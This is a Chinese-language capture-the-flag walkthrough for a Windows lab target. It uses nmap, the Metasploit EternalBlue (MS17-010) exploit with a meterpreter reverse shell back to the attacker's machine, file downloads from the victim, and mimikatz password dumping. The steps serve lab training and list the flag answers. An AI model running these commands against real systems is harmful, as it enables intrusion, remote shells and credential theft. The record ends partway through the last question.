Windows操作系统渗透测试

服务器场景：PYsystem20194
服务器场景操作系统：Windows（版本不详）

没有原资料 仅供查考

1.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行系统服务及版本扫描渗透测试， 并将该操作显示结果中445
端口对应的服务版本信息字符串作为Flag值提交；
输入:nmap -sV -p445 192.168.32.132 #192.168.32.132为我靶机的ip
flag:Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

2.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景网络连接信息中的DNS信息作为Flag值
(例如：114.114.114.114) 提交；
(1.)输入msfconsole 启动msf服务
(2.)输入search ms17_010 查找exploit/windows/smb/ms17_010_eternalblue

(3.)输入use exploit/windows/smb/ms17_010_eternalblue 进行利用模块

(4.)输入show options 查看一下设置

(5.)输入set rhost 192.168.32.132 设置靶机ip
输入set payload windows/x64/meterpreter/reverse_tcp 设置反弹效果
输入set lhost 192.168.32.135 设置反弹回的ip地址
输入show options 查看一下配置完成了吗

输入run

输入shell 进入c盘下

输入ipconfig/all
flag:144.144.144.144

3.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文件名称
作为Flag值提交；
进入cd Desktop #Desktop为桌面路径
dir 查看 flag:flag.docx

4.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文档内容作为
Flag值提交；
接着上题
名字找到了
输入exit 退出c盘下 进入meterpreter下
输入 download C:\Users\Administrator\Desktop\flag.docx 系统会自动给你下载到kali里面
download 为下载
C:\Users\Administrator\Desktop\flag.docx flag.docx 的路径

下载下来之后我打开还是不行 后来问了一个大佬说的 在把文件拖到主机里面打开就可以了
flag:fyfyti



5.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景桌面上222文件夹中唯一一个图片中的英文单词作为Flag值提交;
接着上面的题

输入download C:\Users\Administrator\Desktop\1.jpg 进行下载照片


不知道是我照片的问题还是什么问题 在kali里面打不开照片 也就直接拖到主机了

打开为 ABCD

6.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景中的当前最高账户管理员的密码作为Flag值提交;
输入getuid 进行启动
输入load mimikatz 启动mimikatz模块
输入msv 查看用户和密码
输入wdigest 破出密码 Administrator 的密码为123456

7.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystem20194进行渗透测试，将该场景中回收站内文件的文档内容作为Flag值提交。
在meterpreter下输入
输入cd / 进入根目录
输入cd $Recycle.Bin 进入一下回收站
输入dir 查看一下

cd S-1-5-21-2706487821-2887370924-2198568979-500 进入这里面 尴尬的是我忘记清理回收站了
